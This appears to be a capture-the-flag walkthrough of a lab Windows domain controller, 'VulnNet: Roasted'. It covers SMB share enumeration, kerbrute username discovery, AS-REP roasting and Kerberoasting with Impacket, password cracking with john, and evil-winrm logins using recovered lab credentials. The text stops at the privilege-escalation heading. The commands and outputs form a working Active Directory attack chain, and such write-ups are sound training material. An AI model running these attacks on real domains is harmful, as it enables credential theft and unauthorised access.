# VulnNet: Roasted

## Enumeration

### port  scan - service discovery

```
Nmap scan report for 10.10.125.220
Host is up (0.096s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-11 21:06:12Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open     mc-nmf        .NET Message Framing
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     msrpc         Microsoft Windows RPC
49692/tcp open     msrpc         Microsoft Windows RPC
49783/tcp filtered unknown
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Nmap also determined hostname - `WIN-2BO8M1OE1M1`.

### smb

```
smbclient -N -L \\\\10.10.125.220\\                                                                                                                                                                                               130 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.125.220 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Check each share:

```
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\ADMIN$
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\C$                                                                                                                                                                                                  1 ⨯
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\IPC$                                                                                                                                                                                                1 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_INVALID_INFO_CLASS listing \*
smb: \> exit
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\NETLOGON
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                                                                                                                                                                                
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\SYSVOL                                                                                                                                                                                            130 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\VulnNet-Business-Anonymous
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4527437 blocks available
smb: \> exit
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\VulnNet-Enterprise-Anonymous
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4525617 blocks available
smb: \>
```

From the files above we will extract full names of employees:

> Jack Goldenhand
>
> Tony Skid
>
> Johnny Leet

Maybe we can use it in future attacks.

With `enum4linux -a <ip-address> -v` we get Domain Name and SID:

```
 ============================================ 
|    Getting domain SID for 10.10.125.220    |
 ============================================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: VULNNET-RST
Domain Sid: S-1-5-21-1589833671-435344116-4136949213
[+] Host is part of a domain (not a workgroup)

```

### kerberos

Trying to enumerate usernames with kerbrute tool which perform first step of kerberos authentication - AS REQ. A list of usernames is from `SecLists/Usernames` repository.

```
./kerbrute_linux_amd64 userenum --dc 10.10.125.220 -d VULNNET-RST ~/Downloads/names.txt                                       

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/11/22 - Ronnie Flathers @ropnop

2022/02/11 16:39:04 >  Using KDC(s):
2022/02/11 16:39:04 >   10.10.125.220:88

2022/02/11 16:40:35 >  Done! Tested 10177 usernames (0 valid) in 91.162 seconds
```

I took the names from smb and wrote a simple usernames in different formats. Then, I ran kerbrute again:

```
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/creds]
└─# cat created_usernames.txt 
Jack.Goldenhand
Tony.Skid
Johnny.Leet
J.Goldenhand
T.Skid
J.Leet
Jack
Tony
Johnny
j-goldenhand
t-skid
j-leet
jack-goldenhand
tony-skid
johnny-leet
jackgoldenhand
tonyskid
johnnyleet
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/creds]
└─# /opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.246.213 -d vulnnet-rst.local created_usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/12/22 - Ronnie Flathers @ropnop

2022/02/12 16:44:14 >  Using KDC(s):
2022/02/12 16:44:14 >   10.10.246.213:88

2022/02/12 16:44:14 >  [+] VALID USERNAME:       j-goldenhand@vulnnet-rst.local
2022/02/12 16:44:14 >  [+] VALID USERNAME:       j-leet@vulnnet-rst.local
2022/02/12 16:44:14 >  [+] t-skid has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$t-skid@VULNNET-RST.LOCAL:1e254ca99f806906fbbbf7688efb12b7$73994d985cc647510b5ab4790b58b5458a3278fe4997936912c6ceef245839d476ecd6a54b0b41109b5a7ecb06455ef7135ea574f696dd73c261519850a16a10d797553ca5481e2c7fe150b418b498995c519d786fbbd1df7fce5f1928605ca9fdd195c940847bd4c4c8c5515bd64032bc271f61cca3deb9174ceefa39b77ab87cf82b6aa539cd28874c108be3c7aef79d0d36264c7df23e59354cddfda0840f1b8ac30ba5338111691c838f476fa8c471c5ef4b7c23ef36520ed62d2b1a6a999b94a69d8d2fa95cafe43fe9e1b447534f825a910690ab268edb9dfcf864f73fb64eb4dcc24135a7000d4322efba300ffca356b7547a1e7886ba3e7798b329bd7079e5bdc202a1fd176f                                                                                                        
2022/02/12 16:44:14 >  [+] VALID USERNAME:       t-skid@vulnnet-rst.local
2022/02/12 16:44:14 >  Done! Tested 18 usernames (3 valid) in 0.211 seconds
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/creds]
└─# 

```

kerbrute will perform ASREPRoast attack if the account has `DONT_REQ_PREAUTH`attribute set. So, we found user like that and we can crack encrypted part of AS\_REP and get the user password.

### Stage 2: smb

I dumped all from IPC$ with t-skid's creds. It contains directory with a script \`ResetPassword.vbs\`.

Inside the script we have a new creds:

```visual-basic
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

Tried again kerbrute and got that this user is legitimate&#x20;

```
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.246.213 -d vulnnet-rst.local ../../../creds/created_usernames.txt                   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/12/22 - Ronnie Flathers @ropnop

2022/02/12 17:15:51 >  Using KDC(s):
2022/02/12 17:15:51 >   10.10.246.213:88

2022/02/12 17:15:51 >  [+] VALID USERNAME:       a-whitehat@vulnnet-rst.local
2022/02/12 17:15:51 >  Done! Tested 1 usernames (1 valid) in 0.087 seconds
```

## Gaining access

### t-skid hash cracking

For some reason, john and hashcat don't want to crack the hash from kerbrute, so, let's use impacket tool to get the hash again:

```
GetNPUsers.py -no-pass -dc-ip 10.10.246.213 -request -usersfile created_usernames.txt vulnnet-rst/10.10.246.213 -format john -outputfile hashes                                                                                     2 ⨯
Impacket v0.9.25.dev1+20220203.155819.ed7082cd - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

```
john -w=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$t-skid@VULNNET-RST)     
1g 0:00:00:04 DONE (2022-02-12 17:03) 0.2500g/s 794688p/s 794688c/s 794688C/s tj3929..tizslk51
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we're cool. `tj072889*`. But unfortunately, we don't have a winrm access:

```
evil-winrm -i 10.10.246.213 -u t-skid -p "tj072889*"         

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

Well, I return to enumeration.

### Stage 2: winrm

After obtained a-whitehat creds I ran evil-winrm again:

```
evil-winrm -i 10.10.246.213 -u "a-whitehat" -p "bNdKVkjv3RR9ht"                                                                                                                                                                   130 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\a-whitehat\Documents>
```

This user has access to the home dir of `enterprise-core-vn`. And it contain a user flag.&#x20;

### Kerberoasting

This account `enterprise-core-vn` seems to be service account. Let's find out it with kerberoasting attack:

```
GetUserSPNs.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht -dc-ip 10.10.246.213 -request -outputfile hashes
Impacket v0.9.25.dev1+20220203.155819.ed7082cd - Copyright 2021 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528            
```

Kerberoasting attack is a simple step in kerberos authentication...If we know the user creds we can enumerate SPN(ServicePrincipalNames) on the domain. Why we can do that? Because TGS\_REQ _contains field SPN and TGS\_REP has a TGS key to access service(SPN). This TGS key is encrypted with service owner hash, which is our \`enterprise-core-vn\`._

So, this account is a service account for CIFS or smb. We saved it hash, let's crack it with john:

```
john -w=/usr/share/wordlists/rockyou.txt hashes                                                                                                                                                                                   130 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)     
1g 0:00:00:03 DONE (2022-02-12 17:31) 0.2808g/s 1154Kp/s 1154Kc/s 1154KC/s ryan fm..ry-ray
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we have this account too and, I think, this section is complete.

## Privilege escalation
